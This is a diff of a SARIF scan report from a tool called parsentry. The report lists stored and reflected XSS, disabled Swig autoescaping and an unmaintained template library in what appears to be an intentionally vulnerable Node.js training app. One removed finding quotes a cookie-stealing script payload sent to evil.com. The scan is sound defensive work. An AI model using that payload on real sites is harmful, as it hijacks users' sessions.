@@ -7,115 +7,37 @@
         "driver": {
           "name": "parsentry",
           "version": "0.1.0",
-          "informationUri": "https://github.com/HikaruEgashira/parsentry",
           "rules": [
             {
-              "id": "XSS-AUTOESCAPE-DISABLED",
-              "name": "AutoescapeDisabled",
+              "id": "XSS",
               "shortDescription": {
-                "text": "Swig template engine autoescape globally disabled"
+                "text": "Cross-Site Scripting"
               },
-              "fullDescription": {
-                "text": "swig.setDefaults({ autoescape: false }) disables HTML escaping for all template output. Every dynamic variable rendered in any Swig template becomes an XSS vector. Any user-controlled data (profile fields, memo content, query parameters) injected into templates will be rendered as raw HTML, allowing arbitrary script execution in victims' browsers."
-              },
-              "helpUri": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html",
-              "properties": {
-                "tags": [
-                  "security",
-                  "xss",
-                  "CWE-79",
-                  "A03:2021"
-                ]
-              }
+              "helpUri": "https://owasp.org/www-community/attacks/xss/"
             },
             {
-              "id": "XSS-PROFILE-FIELDS",
-              "name": "StoredXSSViaProfileFields",
+              "id": "SECURITY-MISCONFIG",
               "shortDescription": {
-                "text": "Stored XSS through unescaped profile fields"
+                "text": "Security Misconfiguration"
               },
-              "fullDescription": {
-                "text": "User profile fields (firstName, lastName, website, etc.) are stored in the database and rendered in templates without escaping. An attacker can inject malicious scripts into profile fields that execute when any user views the profile. This is a stored/persistent XSS vulnerability with broad impact since profiles are viewed by other users."
-              },
-              "helpUri": "https://owasp.org/www-community/attacks/xss/#stored-xss-attacks",
-              "properties": {
-                "tags": [
-                  "security",
-                  "xss",
-                  "stored-xss",
-                  "CWE-79",
-                  "A03:2021"
-                ]
-              }
+              "helpUri": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
             },
             {
-              "id": "XSS-MEMO-CONTENT",
-              "name": "StoredXSSViaMemoContent",
+              "id": "DEPRECATED-LIBRARY",
               "shortDescription": {
-                "text": "Stored XSS through unescaped memo/note content"
+                "text": "Use of Unmaintained/Deprecated Library"
               },
-              "fullDescription": {
-                "text": "Memo content submitted by users is rendered in templates without HTML escaping. An attacker can store a memo containing JavaScript payloads that execute when the memo is viewed. Combined with the disabled autoescape, this provides a reliable stored XSS vector."
-              },
-              "helpUri": "https://owasp.org/www-community/attacks/xss/#stored-xss-attacks",
-              "properties": {
-                "tags": [
-                  "security",
-                  "xss",
-                  "stored-xss",
-                  "CWE-79",
-                  "A03:2021"
-                ]
-              }
-            },
-            {
-              "id": "UNMAINTAINED-DEPENDENCY",
-              "name": "UnmaintainedSwigDependency",
-              "shortDescription": {
-                "text": "Swig 1.4.2 is unmaintained and deprecated since 2016"
-              },
-              "fullDescription": {
-                "text": "The application uses Swig 1.4.2 as its template engine. Swig has been unmaintained and deprecated since 2016. It has known security issues including XSS bypasses that will never be patched. Using unmaintained dependencies with known vulnerabilities violates secure supply chain practices."
-              },
-              "helpUri": "https://owasp.org/www-project-dependency-check/",
-              "properties": {
-                "tags": [
-                  "security",
-                  "supply-chain",
-                  "CWE-1104",
-                  "A06:2021"
-                ]
-              }
-            },
-            {
-              "id": "MISSING-CSP-HEADER",
-              "name": "MissingContentSecurityPolicy",
-              "shortDescription": {
-                "text": "No Content-Security-Policy header to mitigate XSS"
-              },
-              "fullDescription": {
-                "text": "The application does not set Content-Security-Policy (CSP) headers. CSP provides defense-in-depth against XSS attacks by restricting which scripts can execute. Without CSP, successful XSS exploitation has no browser-level mitigation, allowing unrestricted script execution, data exfiltration, and session hijacking."
-              },
-              "helpUri": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html",
-              "properties": {
-                "tags": [
-                  "security",
-                  "headers",
-                  "defense-in-depth",
-                  "CWE-1021",
-                  "A05:2021"
-                ]
-              }
+              "helpUri": "https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/"
             }
           ]
         }
       },
       "results": [
         {
-          "ruleId": "XSS-AUTOESCAPE-DISABLED",
+          "ruleId": "SECURITY-MISCONFIG",
           "level": "error",
           "message": {
-            "text": "swig.setDefaults({ autoescape: false }) disables HTML escaping globally. All template variables are rendered as raw HTML, making every dynamic output an XSS vector. This is the root cause enabling all template-based XSS in the application."
+            "text": "Swig template engine autoescape is explicitly disabled (autoescape: false). This globally disables HTML entity encoding for all template variables rendered with {{ }}, exposing every view to reflected and stored XSS. The commented-out fix confirms this is intentional for demonstration but represents a critical misconfiguration."
           },
           "locations": [
             {
@@ -124,42 +46,21 @@
                   "uri": "server.js"
                 },
                 "region": {
-                  "startLine": 1
+                  "startLine": 135,
+                  "endLine": 142
                 }
               }
             }
           ],
           "properties": {
-            "confidence": 0.95
+            "confidence": 1.0
           }
         },
         {
-          "ruleId": "XSS-PROFILE-FIELDS",
+          "ruleId": "XSS",
           "level": "error",
           "message": {
-            "text": "User profile fields (firstName, lastName, website) from the database are rendered in view templates without escaping. An attacker stores malicious JavaScript in profile fields that executes when any user views the profile page, achieving stored XSS."
-          },
-          "locations": [
-            {
-              "physicalLocation": {
-                "artifactLocation": {
-                  "uri": "app/views/profile.html"
-                },
-                "region": {
-                  "startLine": 1
-                }
-              }
-            }
-          ],
-          "properties": {
-            "confidence": 0.95
-          }
-        },
-        {
-          "ruleId": "XSS-MEMO-CONTENT",
-          "level": "error",
-          "message": {
-            "text": "Memo content submitted by users is rendered in templates without HTML escaping. An attacker submits a memo containing a script payload (e.g., <script>document.location='http://evil.com/?c='+document.cookie</script>) that executes when the memo is displayed."
+            "text": "Stored XSS via memo rendering. User-submitted memos are rendered through marked() with autoescape disabled: {{ marked(doc.memo) }}. The marked library's sanitize option is deprecated and unreliable. An attacker can store malicious JavaScript in a memo that executes in every user's browser who views the memos page."
           },
           "locations": [
             {
@@ -168,7 +69,8 @@
                   "uri": "app/views/memos.html"
                 },
                 "region": {
-                  "startLine": 1
+                  "startLine": 31,
+                  "endLine": 31
                 }
               }
             }
@@ -178,19 +80,20 @@
           }
         },
         {
-          "ruleId": "UNMAINTAINED-DEPENDENCY",
-          "level": "warning",
+          "ruleId": "XSS",
+          "level": "error",
           "message": {
-            "text": "Swig 1.4.2 has been deprecated and unmaintained since 2016. Known XSS bypass vulnerabilities exist and will never receive patches. The project should migrate to a maintained template engine (e.g., Nunjucks, EJS with auto-escaping, Handlebars)."
+            "text": "Reflected XSS in profile page. Multiple user-controlled fields (lastName, ssn, dob, bankAcc, bankRouting, address, website, updateError) are rendered unescaped in the profile template via {{ variable }} with autoescape disabled. An attacker who controls these database values (e.g., via profile update) can inject scripts that execute when the profile page is rendered."
           },
           "locations": [
             {
               "physicalLocation": {
                 "artifactLocation": {
-                  "uri": "package.json"
+                  "uri": "app/views/profile.html"
                 },
                 "region": {
-                  "startLine": 1
+                  "startLine": 24,
+                  "endLine": 24
                 }
               }
             }
@@ -200,10 +103,171 @@
           }
         },
         {
-          "ruleId": "MISSING-CSP-HEADER",
+          "ruleId": "XSS",
+          "level": "error",
+          "message": {
+            "text": "Reflected XSS in login page. The loginError and userName variables are rendered unescaped via {{loginError}} and {{userName}}. If the server reflects user input (e.g., a bad username) into these variables without sanitization, an attacker can inject arbitrary HTML/JavaScript."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/login.html"
+                },
+                "region": {
+                  "startLine": 101,
+                  "endLine": 101
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "level": "error",
+          "message": {
+            "text": "Reflected XSS in signup page. Multiple error messages and form re-population values (userNameError, firstNameError, lastNameError, passwordError, verifyError, emailError, userName, firstName, lastName) are rendered without escaping. If the server echoes user input in these variables, script injection is possible."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/signup.html"
+                },
+                "region": {
+                  "startLine": 57,
+                  "endLine": 57
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.85
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "level": "error",
+          "message": {
+            "text": "Stored XSS in layout navigation bar. The {{firstName}} and {{lastName}} variables are rendered unescaped in the layout template's navigation header. Since layout.html is the base template for all authenticated pages, a user who sets their name to a malicious script payload will have it executed on every page load for their session."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/layout.html"
+                },
+                "region": {
+                  "startLine": 75,
+                  "endLine": 75
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "XSS",
           "level": "warning",
           "message": {
-            "text": "No Content-Security-Policy header is configured. Without CSP, the browser places no restrictions on inline scripts or external script sources, maximizing the impact of any XSS vulnerability. At minimum, set script-src to disallow inline scripts and restrict sources."
+            "text": "Unescaped rendering of environmentalScripts in layout and login templates. The {{script}} variable inside the loop is rendered without escaping. If the environmentalScripts array is populated from an untrusted source or can be influenced by an attacker, arbitrary script injection is possible."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/layout.html"
+                },
+                "region": {
+                  "startLine": 126,
+                  "endLine": 127
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.6
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "level": "error",
+          "message": {
+            "text": "Stored XSS in benefits admin page. User-controlled fields (user.firstName, user.lastName, user.benefitStartDate) are rendered unescaped in the benefits table. A user who sets their name to a malicious payload will have it execute in the admin's browser when they view the benefits page."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/benefits.html"
+                },
+                "region": {
+                  "startLine": 51,
+                  "endLine": 52
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "level": "error",
+          "message": {
+            "text": "Stored XSS in allocations page. The {{allocation.firstName}} and {{allocation.lastName}} values are rendered without escaping. An attacker who modifies their profile name to include script tags will have the payload execute when any user views the allocations page."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/allocations.html"
+                },
+                "region": {
+                  "startLine": 35,
+                  "endLine": 35
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.9
+          }
+        },
+        {
+          "ruleId": "XSS",
+          "level": "error",
+          "message": {
+            "text": "Reflected XSS in error template. The {{error}} variable is rendered without escaping in error-template.html. If the error message contains user-controlled input (e.g., from a URL path or parameter that triggers an error), an attacker can inject arbitrary scripts."
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "app/views/error-template.html"
+                },
+                "region": {
+                  "startLine": 11,
+                  "endLine": 11
+                }
+              }
+            }
+          ],
+          "properties": {
+            "confidence": 0.8
+          }
+        },
+        {
+          "ruleId": "DEPRECATED-LIBRARY",
+          "level": "warning",
+          "message": {
+            "text": "Swig 1.4.2 is an unmaintained template engine (last updated 2014, archived). It has known security issues and receives no patches. The project should migrate to a maintained template engine such as Nunjucks, EJS, or Handlebars."
           },
           "locations": [
             {
@@ -212,13 +276,14 @@
                   "uri": "server.js"
                 },
                 "region": {
-                  "startLine": 1
+                  "startLine": 9,
+                  "endLine": 9
                 }
               }
             }
           ],
           "properties": {
-            "confidence": 0.95
+            "confidence": 1.0
           }
         }
       ]
